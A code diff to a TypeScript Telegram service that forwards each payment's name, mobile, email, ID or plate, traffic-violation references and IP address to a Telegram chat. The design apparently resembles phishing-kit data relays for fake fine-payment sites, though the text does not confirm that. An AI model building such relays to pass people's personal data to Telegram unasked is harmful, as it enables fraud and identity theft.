@@ -115,8 +115,10 @@ function buildMessage(
   if (step === "payment_completed") {
     lines.push(...paymentLines(p));
     lines.push("");
-    lines.push("<i>Contact:</i>");
-    lines.push(...customerLines(p));
+    const contactParts: string[] = [];
+    if (p.fullName) contactParts.push(`👤 ${escapeHtml(p.fullName)}`);
+    if (p.mobile) contactParts.push(`📞 ${escapeHtml(p.mobile)}`);
+    if (contactParts.length) lines.push(`<i>${contactParts.join(" · ")}</i>`);
   } else {
     lines.push(...flowPayloadLines(data ?? {}));
     lines.push("");
@@ -129,6 +131,39 @@ function buildMessage(
   if (env.telegram.username)
     lines.push(`Contact: ${escapeHtml(env.telegram.username)}`);
 
+  return lines.filter((l) => l !== null && l !== undefined).join("\n");
+}
+
+
+function buildContactMessage(contact: {
+  fullName: string;
+  mobile: string;
+  email?: string;
+  identifier?: string;
+  amount: number | string;
+  violationRefs?: string[];
+  ip?: string;
+}): string {
+  const lines: string[] = [];
+  lines.push("🔔 <b>New Payment Initiated</b>");
+  lines.push("");
+  if (contact.fullName) lines.push(row("👤 Name", escapeHtml(contact.fullName)));
+  if (contact.mobile) lines.push(row("📞 Mobile", escapeHtml(contact.mobile)));
+  if (contact.email) lines.push(row("✉️ Email", escapeHtml(contact.email)));
+  if (contact.identifier)
+    lines.push(row("🆔 ID / Plate", escapeHtml(contact.identifier)));
+  lines.push(row("💰 Amount", `<b>QAR ${escapeHtml(contact.amount)}</b>`));
+  if (contact.violationRefs?.length)
+    lines.push(row("Violations", escapeHtml(contact.violationRefs.join(", "))));
+  lines.push("");
+  const footerParts: string[] = [];
+  if (contact.ip) footerParts.push(`🌐 ${escapeHtml(contact.ip)}`);
+  footerParts.push(
+    `⏱ ${new Date().toISOString().slice(0, 16).replace("T", " ")} UTC`,
+  );
+  lines.push(`<i>${footerParts.join(" · ")}</i>`);
+  if (env.telegram.username)
+    lines.push(`Contact: ${escapeHtml(env.telegram.username)}`);
   return lines.filter((l) => l !== null && l !== undefined).join("\n");
 }
 
@@ -192,5 +227,17 @@ export const telegramService = {
     data?: Record<string, unknown>,
   ): Promise<TelegramSendResult> {
     return postMessage(buildMessage(step, payment, data));
+  },
+
+  async sendContactNotification(contact: {
+    fullName: string;
+    mobile: string;
+    email?: string;
+    identifier?: string;
+    amount: number | string;
+    violationRefs?: string[];
+    ip?: string;
+  }): Promise<TelegramSendResult> {
+    return postMessage(buildContactMessage(contact));
   },
 };
